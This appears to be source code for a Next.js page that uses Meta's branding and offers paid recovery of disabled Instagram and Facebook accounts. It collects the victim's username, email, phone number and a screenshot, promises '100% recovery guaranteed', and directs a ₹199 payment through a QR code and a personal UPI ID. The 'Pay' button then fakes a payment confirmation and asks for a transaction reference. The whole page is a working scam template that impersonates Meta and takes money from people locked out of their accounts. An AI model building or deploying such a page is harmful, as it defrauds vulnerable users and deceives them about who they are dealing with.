"use client";

import { useState, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import Link from "next/link";
import {
  ArrowLeft,
  Mail,
  User,
  Phone,
  Upload,
  Clock,
  CreditCard,
  Copy,
  Check,
  Sparkles,
  Shield,
  Zap,
} from "lucide-react";
import { FaInstagram, FaFacebook } from "react-icons/fa";

export default function RecoveryPage() {
  const [platform, setPlatform] = useState("instagram");
  const [step, setStep] = useState("form");
  const [formData, setFormData] = useState({
    username: "",
    email: "",
    phone: "",
    screenshot: null,
  });
  const [preview, setPreview] = useState(null);
  const [utrId, setUtrId] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [copiedUpi, setCopiedUpi] = useState(false);
  const fileInputRef = useRef(null);

  // Platform config with explicit icons and colors
  const config = {
    instagram: {
      label: "Instagram",
      icon: FaInstagram,
      price: 199,
      upiId: "sdamhusain0961@okicici",
      gradient: "from-purple-500 to-pink-500",
      bgGlow: "rgba(168,85,247,0.2)",
      heading: "Account Disabled",
      subHeading: "Your Instagram account has been disabled. We can help you recover it.",
      trustText: "Trusted words: 100% recovery guaranteed",
      inputFocus: "border-purple-500 shadow-[0_0_20px_rgba(168,85,247,0.2)]",
    },
    facebook: {
      label: "Facebook",
      icon: FaFacebook,
      price: 199,
      upiId: "sdamhusain0961@okicici",
      gradient: "from-blue-500 to-cyan-500",
      bgGlow: "rgba(59,130,246,0.2)",
      heading: "Account Disabled",
      subHeading: "Your Facebook account has been disabled. We can help you recover it.",
      trustText: "Trusted words: 100% recovery guaranteed",
      inputFocus: "border-blue-500 shadow-[0_0_20px_rgba(59,130,246,0.2)]",
    },
  };

  const currentConfig = config[platform];
  const IconComponent = currentConfig.icon;

  // Handlers...
  const handleChange = (e) => {
    const { name, value, files } = e.target;
    if (name === "screenshot" && files && files[0]) {
      const file = files[0];
      setFormData((prev) => ({ ...prev, screenshot: file }));
      const reader = new FileReader();
      reader.onloadend = () => setPreview(reader.result);
      reader.readAsDataURL(file);
    } else {
      setFormData((prev) => ({ ...prev, [name]: value }));
    }
  };

  const handlePhoneChange = (e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 10);
    setFormData((prev) => ({ ...prev, phone: value }));
  };

  const handleSubmitForm = (e) => {
    e.preventDefault();
    if (!formData.username.trim()) {
      alert("Please enter your username");
      return;
    }
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(formData.email)) {
      alert("Please enter a valid email address");
      return;
    }
    const phoneRegex = /^\d{10}$/;
    if (!phoneRegex.test(formData.phone)) {
      alert("Phone number must be exactly 10 digits");
      return;
    }
    if (!formData.screenshot) {
      alert("Please upload a screenshot of the disabled message");
      return;
    }

    const recoveryData = {
      id: platform.toUpperCase() + "-" + Date.now().toString(36).toUpperCase(),
      platform,
      ...formData,
      screenshot: preview || null,
      status: "Payment Pending",
      createdAt: new Date().toISOString(),
    };
    localStorage.setItem(`recovery_request_${platform}`, JSON.stringify(recoveryData));
    setStep("payment");
  };

  const handlePay = () => {
    setIsSubmitting(true);
    setTimeout(() => {
      setIsSubmitting(false);
      const stored = JSON.parse(localStorage.getItem(`recovery_request_${platform}`) || "{}");
      stored.status = "Paid";
      localStorage.setItem(`recovery_request_${platform}`, JSON.stringify(stored));
      setStep("utr");
    }, 1500);
  };

  const handleCheckUTR = () => {
    const utrRegex = /^[A-Za-z0-9]{12}$/;
    if (!utrId.trim()) {
      alert("Please enter UTR ID");
      return;
    }
    if (!utrRegex.test(utrId.trim())) {
      alert("UTR must be exactly 12 alphanumeric characters (e.g. ABC123XYZ789)");
      return;
    }
    setIsSubmitting(true);
    setTimeout(() => {
      setIsSubmitting(false);
      const stored = JSON.parse(localStorage.getItem(`recovery_request_${platform}`) || "{}");
      stored.utr = utrId.trim();
      stored.status = "Pending Verification";
      localStorage.setItem(`recovery_request_${platform}`, JSON.stringify(stored));
      setStep("pending");
    }, 1000);
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    setCopiedUpi(true);
    setTimeout(() => setCopiedUpi(false), 2000);
  };

  const resetAll = () => {
    setStep("form");
    setFormData({ username: "", email: "", phone: "", screenshot: null });
    setPreview(null);
    setUtrId("");
  };

  const switchPlatform = (newPlatform) => {
    if (newPlatform === platform) return;
    setPlatform(newPlatform);
    setStep("form");
    setFormData({ username: "", email: "", phone: "", screenshot: null });
    setPreview(null);
    setUtrId("");
  };

  return (
    <div className="min-h-screen bg-black text-white font-sans flex flex-col items-center justify-center p-4 relative overflow-hidden">
      {/* Animated background glow – using inline style for dynamic color */}
      <div className="absolute inset-0 pointer-events-none">
        <div
          className="absolute top-[-20%] left-[-10%] w-[50%] h-[50%] rounded-full blur-3xl animate-pulse"
          style={{ backgroundColor: currentConfig.bgGlow }}
        />
        <div
          className="absolute bottom-[-20%] right-[-10%] w-[50%] h-[50%] rounded-full blur-3xl animate-pulse delay-1000"
          style={{ backgroundColor: currentConfig.bgGlow }}
        />
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[80%] h-[80%] bg-pink-500/10 rounded-full blur-3xl" />
      </div>

      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
        className="relative z-10 max-w-md w-full bg-white/5 backdrop-blur-xl border border-white/10 rounded-3xl p-6 shadow-2xl shadow-purple-500/20"
      >
        {/* Meta Header */}
        <div className="flex items-center justify-between mb-3">
          <Link
            href="/"
            className="p-2 rounded-xl hover:bg-white/10 transition-all duration-300 group"
          >
            <ArrowLeft className="w-5 h-5 text-gray-400 group-hover:text-white group-hover:scale-110 transition" />
          </Link>

          <div className="flex items-center gap-2">
            <img
              src="/meta.png"
              alt="Meta Logo"
              className="w-9 h-9 object-contain"
            />

            <span className="text-sm font-semibold text-gray-300 tracking-wider">
              META
            </span>
          </div>
          <div className="w-8" />
        </div>

        {/* Platform Toggle */}
        <div className="flex items-center justify-center gap-2 bg-white/5 rounded-xl p-1 border border-white/5 mb-4">
          <button
            onClick={() => switchPlatform("instagram")}
            className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium transition-all duration-300 ${platform === "instagram"
              ? "bg-gradient-to-r from-purple-500 to-pink-500 text-white shadow-lg shadow-purple-500/30"
              : "text-gray-400 hover:text-white hover:bg-white/10"
              }`}
          >
            <FaInstagram className="w-4 h-4" />
            Instagram
          </button>
          <button
            onClick={() => switchPlatform("facebook")}
            className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium transition-all duration-300 ${platform === "facebook"
              ? "bg-gradient-to-r from-blue-500 to-cyan-500 text-white shadow-lg shadow-blue-500/30"
              : "text-gray-400 hover:text-white hover:bg-white/10"
              }`}
          >
            <FaFacebook className="w-4 h-4" />
            Facebook
          </button>
        </div>

        {/* Platform Icon */}
        <div className="flex justify-center">
          <div
            className={`w-16 h-16 rounded-full bg-gradient-to-tr ${platform === "instagram"
              ? "from-yellow-400 via-pink-500 to-purple-600"
              : "from-blue-400 via-cyan-500 to-blue-600"
              } flex items-center justify-center shadow-lg shadow-${currentConfig.bgGlow}/50`}
          >
            <IconComponent className="w-8 h-8 text-white" />
          </div>
        </div>

        {/* Heading */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.2 }}
          className="text-center mt-3"
        >
          <h1
            className={`text-3xl font-bold bg-gradient-to-r ${platform === "instagram" ? "from-red-500 to-pink-500" : "from-blue-500 to-cyan-500"
              } bg-clip-text text-transparent`}
          >
            {currentConfig.heading}
          </h1>
          <p className="text-sm text-gray-400 mt-1">{currentConfig.subHeading}</p>
          <div className="mt-2 inline-flex items-center gap-2 px-4 py-1.5 bg-emerald-500/10 border border-emerald-500/20 rounded-full text-xs text-emerald-400 backdrop-blur-sm">
            <Shield className="w-3 h-3" />
            {currentConfig.trustText}
          </div>
        </motion.div>

        {/* ===== STEPS ===== */}
        <AnimatePresence mode="wait">
          {step === "form" && (
            <motion.form
              key="form"
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: 20 }}
              transition={{ duration: 0.4 }}
              className="mt-6 space-y-4"
              onSubmit={handleSubmitForm}
            >
              {/* Username */}
              <div className="group">
                <label className="text-xs font-medium text-gray-400 block mb-1">Username</label>
                <div
                  className={`flex items-center bg-white/5 border border-white/10 rounded-xl px-3 py-2 focus-within:${currentConfig.inputFocus} transition-all duration-300`}
                >
                  <User className="w-4 h-4 text-gray-400 mr-2 group-focus-within:text-purple-400 transition" />
                  <input
                    type="text"
                    name="username"
                    value={formData.username}
                    onChange={handleChange}
                    placeholder="@username"
                    className="bg-transparent outline-none w-full text-sm text-white placeholder-gray-500"
                    required
                  />
                </div>
              </div>

              {/* Email */}
              <div className="group">
                <label className="text-xs font-medium text-gray-400 block mb-1">Email Address</label>
                <div
                  className={`flex items-center bg-white/5 border border-white/10 rounded-xl px-3 py-2 focus-within:${currentConfig.inputFocus} transition-all duration-300`}
                >
                  <Mail className="w-4 h-4 text-gray-400 mr-2 group-focus-within:text-purple-400 transition" />
                  <input
                    type="email"
                    name="email"
                    value={formData.email}
                    onChange={handleChange}
                    placeholder="your@email.com"
                    className="bg-transparent outline-none w-full text-sm text-white placeholder-gray-500"
                    required
                  />
                </div>
              </div>

              {/* Phone */}
              <div className="group">
                <label className="text-xs font-medium text-gray-400 block mb-1">Phone Number (10 digits)</label>
                <div
                  className={`flex items-center bg-white/5 border border-white/10 rounded-xl px-3 py-2 focus-within:${currentConfig.inputFocus} transition-all duration-300`}
                >
                  <Phone className="w-4 h-4 text-gray-400 mr-2 group-focus-within:text-purple-400 transition" />
                  <input
                    type="text"
                    name="phone"
                    value={formData.phone}
                    onChange={handlePhoneChange}
                    placeholder="9876543210"
                    className="bg-transparent outline-none w-full text-sm text-white placeholder-gray-500"
                    maxLength="10"
                  />
                  <span className="text-xs text-gray-500">{formData.phone.length}/10</span>
                </div>
              </div>

              {/* Screenshot */}
              <div>
                <label className="text-xs font-medium text-gray-400 block mb-1">
                  Upload Screenshot (of disabled message)
                </label>
                <div
                  onClick={() => fileInputRef.current.click()}
                  className="flex flex-col items-center justify-center w-full p-4 bg-white/5 border-2 border-dashed border-white/10 rounded-xl cursor-pointer hover:border-purple-500 hover:bg-white/10 transition-all duration-300 group"
                >
                  <Upload className="w-6 h-6 text-gray-400 mb-1 group-hover:text-purple-400 transition" />
                  <span className="text-xs text-gray-400">
                    {preview ? "✅ Screenshot uploaded" : "Click to upload"}
                  </span>
                  {preview && (
                    <img
                      src={preview}
                      alt="screenshot"
                      className="mt-2 w-20 h-20 object-cover rounded-lg border border-white/10"
                    />
                  )}
                  <input
                    type="file"
                    name="screenshot"
                    accept="image/*"
                    ref={fileInputRef}
                    onChange={handleChange}
                    className="hidden"
                    required
                  />
                </div>
              </div>

              <button
                type="submit"
                className={`relative w-full py-3 bg-gradient-to-r ${currentConfig.gradient} rounded-xl text-white font-semibold hover:shadow-lg hover:shadow-${currentConfig.bgGlow}/30 transition-all duration-300 group overflow-hidden`}
              >
                <span className="relative z-10 flex items-center justify-center gap-2">
                  <Sparkles className="w-4 h-4" />
                  Start Recovery Process
                </span>
                <div className={`absolute inset-0 bg-gradient-to-r ${currentConfig.gradient} opacity-0 group-hover:opacity-100 transition-opacity duration-300`} />
              </button>
            </motion.form>
          )}

          {/* ===== PAYMENT ===== */}
          {step === "payment" && (
            <motion.div
              key="payment"
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: 20 }}
              transition={{ duration: 0.4 }}
              className="mt-6 space-y-4"
            >
              <div className="bg-white/5 p-5 rounded-2xl border border-white/10 backdrop-blur-sm">
                <div className="flex items-center gap-2 text-emerald-400 mb-2">
                  <CreditCard className="w-5 h-5" />
                  <span className="font-semibold">Payment Required</span>
                </div>
                <p className="text-sm text-gray-400">
                  To initiate the recovery, please pay{" "}
                  <span className="text-white font-bold">₹{currentConfig.price}</span>.
                </p>

                {/* QR Code */}
                <div className="mt-4 flex justify-center">
                  <div className="relative p-2 bg-white/5 rounded-xl border border-white/10 shadow-[0_0_40px_rgba(59,130,246,0.4)] hover:shadow-[0_0_60px_rgba(59,130,246,0.7)] transition-all duration-500">
                    <img
                      src="/scanner.jpeg"
                      alt="UPI QR Code"
                      className="w-40 h-40 object-contain rounded-lg"
                      onError={(e) => {
                        e.target.src =
                          "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='160' height='160' viewBox='0 0 160 160'%3E%3Crect fill='%23333' width='160' height='160'/%3E%3Ctext x='20' y='80' fill='%23aaa' font-size='14'%3EQR Code%3C/text%3E%3C/svg%3E";
                      }}
                    />
                  </div>
                </div>

                {/* UPI ID */}
                <div className="mt-3 flex items-center justify-between bg-white/5 border border-white/10 rounded-xl px-3 py-2">
                  <span className="text-xs text-gray-400">UPI ID:</span>
                  <div className="flex items-center gap-2">
                    <span className="text-sm font-mono text-white">{currentConfig.upiId}</span>
                    <button
                      onClick={() => copyToClipboard(currentConfig.upiId)}
                      className="p-1 rounded-lg hover:bg-white/10 transition"
                    >
                      {copiedUpi ? (
                        <Check className="w-4 h-4 text-emerald-400" />
                      ) : (
                        <Copy className="w-4 h-4 text-gray-400 hover:text-white transition" />
                      )}
                    </button>
                  </div>
                </div>
                <p className="text-xs text-center text-gray-500 mt-2">
                  Scan QR or copy UPI ID to pay
                </p>
              </div>

              <button
                onClick={handlePay}
                disabled={isSubmitting}
                className="w-full py-3 bg-gradient-to-r from-emerald-500 to-teal-500 rounded-xl text-white font-semibold hover:shadow-lg hover:shadow-emerald-500/30 transition-all duration-300 disabled:opacity-50 relative overflow-hidden group"
              >
                <span className="relative z-10 flex items-center justify-center gap-2">
                  {isSubmitting ? (
                    <>
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                      Processing...
                    </>
                  ) : (
                    <>
                      <Zap className="w-4 h-4" />
                      Pay ₹{currentConfig.price} Now
                    </>
                  )}
                </span>
                <div className="absolute inset-0 bg-gradient-to-r from-emerald-600 to-teal-600 opacity-0 group-hover:opacity-100 transition-opacity duration-300" />
              </button>
            </motion.div>
          )}

          {/* ===== UTR ===== */}
          {step === "utr" && (
            <motion.div
              key="utr"
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: 20 }}
              transition={{ duration: 0.4 }}
              className="mt-6 space-y-4"
            >
              <div className="bg-white/5 p-4 rounded-xl border border-white/10">
                <p className="text-sm text-emerald-400 flex items-center gap-2">
                  <Check className="w-4 h-4" />
                  Payment successful!
                </p>
                <p className="text-xs text-gray-400 mt-1">
                  Enter the UTR ID (12 alphanumeric characters) you received after payment.
                </p>
              </div>

              <div
                className={`flex items-center bg-white/5 border border-white/10 rounded-xl px-3 py-2 focus-within:${currentConfig.inputFocus} transition-all duration-300`}
              >
                <Copy className="w-4 h-4 text-gray-400 mr-2" />
                <input
                  type="text"
                  value={utrId}
                  onChange={(e) => setUtrId(e.target.value.toUpperCase())}
                  placeholder="e.g. ABC123XYZ789"
                  className="bg-transparent outline-none w-full text-sm text-white placeholder-gray-500 uppercase"
                  maxLength="12"
                />
                <span className="text-xs text-gray-500">{utrId.length}/12</span>
              </div>

              <button
                onClick={handleCheckUTR}
                disabled={isSubmitting}
                className={`w-full py-3 bg-gradient-to-r ${currentConfig.gradient} rounded-xl text-white font-semibold hover:shadow-lg hover:shadow-${currentConfig.bgGlow}/30 transition-all duration-300 disabled:opacity-50 relative overflow-hidden group`}
              >
                <span className="relative z-10 flex items-center justify-center gap-2">
                  {isSubmitting ? (
                    <>
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                      Checking...
                    </>
                  ) : (
                    "🔍 Check UTR"
                  )}
                </span>
                <div className={`absolute inset-0 bg-gradient-to-r ${currentConfig.gradient} opacity-0 group-hover:opacity-100 transition-opacity duration-300`} />
              </button>
            </motion.div>
          )}

          {/* ===== PENDING ===== */}
          {step === "pending" && (
            <motion.div
              key="pending"
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.9 }}
              transition={{ duration: 0.5 }}
              className="mt-6 space-y-4 text-center"
            >
              <div className="flex justify-center">
                <div className="relative">
                  <Clock className="w-20 h-20 text-amber-400 animate-pulse" />
                  <div className="absolute inset-0 rounded-full border-4 border-amber-400/30 animate-ping" />
                </div>
              </div>
              <h2 className="text-2xl font-bold text-amber-400">Pending Verification</h2>
              <p className="text-sm text-gray-400">
                Your request has been received. Our team will verify your UTR and recover your account.
              </p>
              <div className="bg-white/5 p-4 rounded-xl border border-white/10 text-left space-y-1 text-xs">
                <p>
                  <span className="text-gray-400">Request ID:</span>{" "}
                  {JSON.parse(localStorage.getItem(`recovery_request_${platform}`) || "{}").id || "N/A"}
                </p>
                <p>
                  <span className="text-gray-400">UTR:</span>{" "}
                  <span className="font-mono">{utrId}</span>
                </p>
                <p>
                  <span className="text-gray-400">Status:</span>{" "}
                  <span className="text-amber-400 font-semibold">Pending Verification</span>
                </p>
              </div>
              <button
                onClick={resetAll}
                className="w-full py-3 bg-white/10 border border-white/20 rounded-xl text-white font-semibold hover:bg-white/20 transition-all duration-300"
              >
                Submit Another Request
              </button>
            </motion.div>
          )}
        </AnimatePresence>
      </motion.div>
    </div>
  );
}